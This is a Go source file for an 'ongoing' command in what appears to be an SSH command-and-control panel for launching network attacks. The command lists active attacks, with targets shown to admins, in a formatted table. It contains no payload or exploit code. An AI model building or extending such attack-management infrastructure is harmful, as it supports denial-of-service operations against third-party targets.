package cmds

import (
	"fmt"
	"io"
	"strings"
	"visioncnc/database"
	"visioncnc/utils"

	"github.com/gliderlabs/ssh"
)

// OngoingCommand example command, not restricted to admins
type OngoingCommand struct{}

func (c *OngoingCommand) Name() string {
	return "ongoing"
}

func (c *OngoingCommand) Execute(session ssh.Session, db *database.Database, args []string, output io.Writer) {
	// Get user info and current attacks
	userInfo := db.GetAccountInfo(session.User())
	currentAttacks := db.GetCurrentAttacks()

	// Check if there are no attacks
	if len(currentAttacks) == 0 {
		utils.SendMessage(session, "\u001B[91mNo ongoing attacks.\u001B[0m", true)
		return
	}

	// Step 1: Define columns based on user type
	var columns []string
	if userInfo.Admin == 1 {
		columns = []string{"#", "Username", "Target", "Duration", "Method"}
	} else {
		columns = []string{"#", "Username", "Duration", "Method"}
	}

	// Step 2: Prepare header and data rows
	headerRow := columns
	dataRows := [][]string{}
	for index, attack := range currentAttacks {
		row := []string{}
		for _, col := range columns {
			switch col {
			case "#":
				row = append(row, fmt.Sprintf("%d", index+1))
			case "Username":
				row = append(row, attack.Username)
			case "Target":
				if userInfo.Admin == 1 {
					row = append(row, attack.Target)
				}
			case "Duration":
				row = append(row, fmt.Sprintf("%d", attack.Duration))
			case "Method":
				row = append(row, attack.Method)
			}
		}
		dataRows = append(dataRows, row)
	}

	// Step 3: Calculate maximum length for each column
	maxLengths := make([]int, len(columns))
	for i, header := range headerRow {
		maxLengths[i] = len(header)
	}
	for _, row := range dataRows {
		for i, cell := range row {
			if len(cell) > maxLengths[i] {
				maxLengths[i] = len(cell)
			}
		}
	}

	// Step 4: Calculate total width for each column (including padding)
	totalWidths := make([]int, len(columns))
	for i, maxLen := range maxLengths {
		totalWidths[i] = maxLen + 2 // Add 2 for spaces on both sides
	}

	// Step 5: Print the table
	// Top border
	fmt.Fprint(output, "╔")
	for i, width := range totalWidths {
		if i > 0 {
			fmt.Fprint(output, "╦")
		}
		fmt.Fprint(output, strings.Repeat("═", width))
	}
	fmt.Fprintln(output, "╗")

	// Header row
	fmt.Fprint(output, "║")
	for i, header := range headerRow {
		padded := fmt.Sprintf(" %-*s ", maxLengths[i], header) // Left-align with padding
		fmt.Fprint(output, padded)
		fmt.Fprint(output, "║")
	}
	fmt.Fprintln(output)

	// Separator row
	fmt.Fprint(output, "╠")
	for i, width := range totalWidths {
		if i > 0 {
			fmt.Fprint(output, "╬")
		}
		fmt.Fprint(output, strings.Repeat("═", width))
	}
	fmt.Fprintln(output, "╣")

	// Data rows
	for _, row := range dataRows {
		fmt.Fprint(output, "║")
		for i, cell := range row {
			padded := fmt.Sprintf(" %-*s ", maxLengths[i], cell) // Left-align with padding
			fmt.Fprint(output, padded)
			fmt.Fprint(output, "║")
		}
		fmt.Fprintln(output)
	}

	// Bottom border
	fmt.Fprint(output, "╚")
	for i, width := range totalWidths {
		if i > 0 {
			fmt.Fprint(output, "╩")
		}
		fmt.Fprint(output, strings.Repeat("═", width))
	}
	fmt.Fprintln(output, "╝")
}

func (c *OngoingCommand) AdminOnly() bool {
	return false
}

// Aliases for OngoingCommand
func (c *OngoingCommand) Aliases() []string {
	return []string{"ongoing", "attacks"}
}

// Register OngoingCommand in the CommandMap
func init() {
	CommandMap["ongoing"] = &OngoingCommand{}
}
